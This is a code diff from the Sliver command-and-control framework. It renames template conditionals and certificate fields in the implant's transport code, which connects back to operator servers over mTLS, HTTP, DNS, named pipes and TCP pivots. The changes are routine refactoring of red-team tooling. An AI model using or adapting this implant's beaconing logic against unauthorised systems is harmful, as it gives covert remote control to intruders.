@@ -20,7 +20,7 @@ package transports
 
 import (
 
-	// {{if or .HTTPc2Enabled .TCPPivotc2Enabled}}
+	// {{if or IsHTTPEnabled IsTCPPivotEnabled}}
 	"net"
 	// {{end}}
 
@@ -38,19 +38,19 @@ import (
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	// {{if .HTTPc2Enabled}}
+	// {{if IsHTTPEnabled}}
 	"github.com/golang/protobuf/proto"
 	// {{end}}
 
-	// {{if .TCPPivotc2Enabled}}
+	// {{if IsTCPPivotEnabled}}
 	"strings"
 	// {{end}}
 )
 
 var (
-	keyPEM    = `{{.Key}}`
-	certPEM   = `{{.Cert}}`
-	caCertPEM = `{{.CACert}}`
+	keyPEM    = `{{.ECC_ClientKey}}`
+	certPEM   = `{{.ECC_ClientCert}}`
+	caCertPEM = `{{.ECC_CACert}}`
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
@@ -131,7 +131,7 @@ func StartConnectionLoop() *Connection {
 		switch uri.Scheme {
 
 		// *** MTLS ***
-		// {{if .MTLSc2Enabled}}
+		// {{if IsMTLSEnabled}}
 		case "mtls":
 			connection, err = mtlsConnect(uri)
 			if err == nil {
@@ -149,7 +149,7 @@ func StartConnectionLoop() *Connection {
 			fallthrough
 		case "http":
 			// *** HTTP ***
-			// {{if .HTTPc2Enabled}}
+			// {{if IsHTTPEnabled}}
 			connection, err = httpConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
@@ -164,7 +164,7 @@ func StartConnectionLoop() *Connection {
 
 		case "dns":
 			// *** DNS ***
-			// {{if .DNSc2Enabled}}
+			// {{if IsDNSEnabled}}
 			connection, err = dnsConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
@@ -179,7 +179,7 @@ func StartConnectionLoop() *Connection {
 
 		case "namedpipe":
 			// *** Named Pipe ***
-			// {{if .NamePipec2Enabled}}
+			// {{if IsNamePipeEnabled}}
 			connection, err = namedPipeConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
@@ -193,7 +193,7 @@ func StartConnectionLoop() *Connection {
 			// {{end}} -NamePipec2Enabled
 
 		case "tcppivot":
-			// {{if .TCPPivotc2Enabled}}
+			// {{if IsTCPPivotEnabled}}
 			connection, err = tcpPivotConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
@@ -226,7 +226,7 @@ func StartConnectionLoop() *Connection {
 
 var ccServers = []string{
 	// {{range $index, $value := .C2}}
-	"{{$value}}", // {{$index}}
+	"{{$value.URL}}", // {{$index}}
 	// {{end}}
 }
 
@@ -265,7 +265,7 @@ func getMaxConnectionErrors() int {
 	return maxConnectionErrors
 }
 
-// {{if .MTLSc2Enabled}}
+// {{if IsMTLSEnabled}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Debug}}
 	log.Printf("Connecting -> %s", uri.Host)
@@ -326,7 +326,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} -MTLSc2Enabled
 
-// {{if .HTTPc2Enabled}}
+// {{if IsHTTPEnabled}}
 func httpConnect(uri *url.URL) (*Connection, error) {
 
 	// {{if .Debug}}
@@ -420,7 +420,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} -HTTPc2Enabled
 
-// {{if .DNSc2Enabled}}
+// {{if IsDNSEnabled}}
 func dnsConnect(uri *url.URL) (*Connection, error) {
 	dnsParent := uri.Hostname()
 	// {{if .Debug}}
@@ -473,7 +473,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} - .DNSc2Enabled
 
-// {{if .NamePipec2Enabled}}
+// {{if IsNamePipeEnabled}}
 func namedPipeConnect(uri *url.URL) (*Connection, error) {
 	conn, err := namePipeDial(uri)
 	if err != nil {
@@ -531,7 +531,7 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} -NamePipec2Enabled
 
-// {{if .TCPPivotc2Enabled}}
+// {{if IsTCPPivotEnabled}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
 	conn, err := net.Dial("tcp", addr)
